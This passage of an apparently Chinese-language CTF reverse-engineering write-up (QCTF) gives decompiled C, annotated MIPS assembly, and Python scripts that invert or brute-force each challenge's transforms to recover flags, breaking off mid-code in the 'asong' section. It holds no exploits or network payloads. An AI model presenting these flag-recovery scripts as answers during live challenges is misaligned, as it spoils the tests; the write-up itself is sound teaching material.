+  <span class="n">v1</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">48</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">45</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mi">33</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">103</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mi">75</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mi">115</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">48</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">85</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+  <span class="n">sub_D270</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">v1</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">sub_10E90</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sub_CCF0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">.</span><span class="n">private_2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27B2B0</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="s">"wrong</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span><span class="c1">// correct
+</span>    <span class="n">sub_16AB0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">.</span><span class="n">private_2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">sub_CCF0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27B2C0</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="s">"wrong</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">sub_16AB0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">sub_D030</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
+  <span class="n">sub_D030</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>最后逆操作脚本</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">reverse_snd</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x20</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">-</span> <span class="mi">7</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">-</span> <span class="mi">18</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">-</span> <span class="mi">88</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">reverse_trd</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x20</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span>
+        <span class="n">tmp</span> <span class="o">=</span> <span class="n">src</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">reverse_fst</span><span class="p">(</span><span class="n">src</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span><span class="mh">0x20</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span>
+        <span class="n">res</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
+        <span class="n">res</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+
+<span class="n">v1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x20</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">218</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">216</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">76</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">227</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">99</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">105</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">63</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">145</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">105</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">227</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">92</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">115</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">126</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">91</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">145</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">37</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">48</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">45</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mi">33</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">103</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mi">75</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mi">115</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">48</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">85</span><span class="p">;</span>
+<span class="n">v1</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+
+<span class="n">final</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">reverse_fst</span><span class="p">(</span><span class="n">reverse_snd</span><span class="p">(</span><span class="n">reverse_trd</span><span class="p">(</span><span class="n">final</span><span class="p">)))</span>
+<span class="k">print</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span><span class="n">flag</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="babymips">babymips</h2>
+
+<p>每次mips都是手撸汇编的。。。大概就是先异或<code class="prettyprint">0x20-i</code>，再根据奇偶性做不同的左移右移。。。</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">loc_400A1C:
+lw      $v0, 0x48+i($fp)
+addiu   $v1, $fp, 0x48+i
+addu    $v0, $v1, $v0
+lb      $v1, 4($v0)      # input[i]
+#这里注意，i的指针+4就是input，前面"addiu $v1, $fp, 0x48+i"也是load i的指针
+#这里再+4，不知道为啥编译器会编译成这样。。。
+#后面很多地方同理。。。
+lw      $v0, 0x48+i($fp)
+nop
+andi    $v0, 0xFF
+li      $a0, 0x20
+subu    $v0, $a0, $v0    # 0x20-i
+andi    $v0, 0xFF
+sll     $v0, 24
+sra     $v0, 24
+xor     $v0, $v1, $v0    # input[i] ^ (0x20-i)
+sll     $v1, $v0, 24
+sra     $v1, 24
+lw      $v0, 0x48+i($fp)
+addiu   $a0, $fp, 0x48+i
+addu    $v0, $a0, $v0
+sb      $v1, 4($v0) #xor结果存回去
+lw      $v0, 0x48+i($fp)
+nop
+addiu   $v0, 1
+sw      $v0, 0x48+i($fp)
+loc_400A78:
+lw      $v0, 0x48+i($fp)
+nop
+slti    $v0, 0x20 # i = [0:0x20)
+bnez    $v0, loc_400A1C
+nop
+</code></pre></div>
+<p>然后循环退出，检查前面五个byte，估计就是<code class="prettyprint">qctf{</code>或者<code class="prettyprint">QCTF{</code>了。</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">lui     $v0, 0x41
+lw      $v1, _fdata
+addiu   $v0, $fp, 0x48+input
+li      $a2, 5           # n
+move    $a1, $v1         # s2
+move    $a0, $v0         # s1
+jal     strncmp
+nop
+bnez    $v0, loc_400ACC #wrong
+nop
+addiu   $v0, $fp, 0x48+input
+move    $a0, $v0
+jal     check2
+nop
+b       loc_400ADC
+nop
+</code></pre></div>
+<p>然后看check2</p>
+
+<p>循环，从5到<code class="prettyprint">strlen(input)-1</code>，即<code class="prettyprint">[5:0x20)</code>，循环里面的内容如下</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">loop:
+lw      $v0, 0x28+i($fp)
+nop
+andi    $v0, 1
+beqz    $v0, even
+nop
+#odd
+lw      $v0, 0x28+i($fp)
+lw      $v1, 0x28+p_input($fp)
+nop
+addu    $v0, $v1, $v0
+lb      $v0, 0($v0)
+nop
+sra     $v0, 2           # [i] &gt;&gt; 2 | [i] &lt;&lt; 6
+sll     $a0, $v0, 24
+sra     $a0, 24
+lw      $v0, 0x28+i($fp)
+lw      $v1, 0x28+p_input($fp)
+nop
+addu    $v0, $v1, $v0
+lb      $v0, 0($v0)
+nop
+sll     $v0, 6
+sll     $v1, $v0, 24
+sra     $v1, 24
+lw      $v0, 0x28+i($fp)
+lw      $a1, 0x28+p_input($fp)
+nop
+addu    $v0, $a1, $v0
+or      $v1, $a0, $v1
+sll     $v1, 24
+sra     $v1, 24
+sb      $v1, 0($v0)
+b       loc_400900
+nop
+even:
+lw      $v0, 0x28+i($fp)
+lw      $v1, 0x28+p_input($fp)
+nop
+addu    $v0, $v1, $v0
+lb      $v0, 0($v0)      # [i] &lt;&lt; 2 | [i] &gt;&gt; 6
+nop
+sll     $v0, 2
+sll     $a0, $v0, 24
+sra     $a0, 24
+lw      $v0, 0x28+i($fp)
+lw      $v1, 0x28+p_input($fp)
+nop
+addu    $v0, $v1, $v0
+lb      $v0, 0($v0)
+nop
+sra     $v0, 6
+sll     $v1, $v0, 24
+sra     $v1, 24
+lw      $v0, 0x28+i($fp)
+lw      $a1, 0x28+p_input($fp)
+nop
+addu    $v0, $a1, $v0
+or      $v1, $a0, $v1
+sll     $v1, 24
+sra     $v1, 24
+sb      $v1, 0($v0)
+</code></pre></div>
+<p>很多左移右移24的废指令，那些其实是<code class="prettyprint">(int)c</code>这样的c生成的代码，这里我们不看高24字节，只看低8位，所以没什么用。</p>
+
+<p>所以最后逐字节爆破脚本</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">flag</span> <span class="o">=</span> <span class="s">"qctf{"</span>
+<span class="n">keys</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span>
+<span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span>  <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
+<span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">]</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x20</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">):</span>
+        <span class="n">fst</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="p">((</span><span class="mh">0x20</span><span class="o">-</span><span class="n">i</span><span class="p">)))</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="p">((</span><span class="n">fst</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">fst</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">fst</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">fst</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">5</span><span class="p">]):</span>
+            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">flag</span>
+</code></pre></div>
+<h2 id="asong">asong</h2>
+
+<p>这题好像坑了我最久。。。他有一个把字符转成数字的<code class="prettyprint">0x400936</code>函数，大概是他会先统计给定歌词每个字符的频率，然后把输入映射到相应字符的频率上，再打乱顺序，做左移右移变换。（打乱顺序的table一开始dump错了，卡了很久，晕。。。）</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">freq_song</span><span class="p">;</span> <span class="c1">// ST00_8
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// ST08_8
+</span>
+  <span class="n">freq_song</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xBCuLL</span><span class="p">);</span>                  <span class="c1">// 47*4
+</span>  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x50uLL</span><span class="p">);</span>
+  <span class="n">init_0</span><span class="p">();</span>
+  <span class="n">read_input</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+  <span class="n">take_mid_part</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+  <span class="n">text_freq_stats</span><span class="p">(</span><span class="s">"that_girl"</span><span class="p">,</span> <span class="n">freq_song</span><span class="p">);</span> <span class="c1">//这里访问了未初始化堆。。。虽然都是0。。。
+</span>  <span class="n">critical_400E54</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">freq_song</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">critical_400E54</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span> <span class="n">_DWORD</span> <span class="o">*</span><span class="n">freq_song</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-48h]
+</span>  <span class="kt">int</span> <span class="n">a3</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-44h]
+</span>  <span class="kt">char</span> <span class="n">freq_input</span><span class="p">[</span><span class="mi">56</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-40h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-8h]
+</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">a3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">a3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">freq_input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">freq_song</span><span class="p">[</span><span class="n">char_to_num_below47</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">])];</span>
+  <span class="n">transform_freq_input1</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">freq_input</span><span class="p">);</span>
+  <span class="n">transform_freq_input2</span><span class="p">(</span><span class="n">freq_input</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
+  <span class="n">write_to_file</span><span class="p">(</span><span class="n">freq_input</span><span class="p">,</span> <span class="s">"out"</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v6</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>trans1是根据全局变量的table打乱顺序</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">transform_freq_input1</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">freq_input</span><span class="p">)</span>
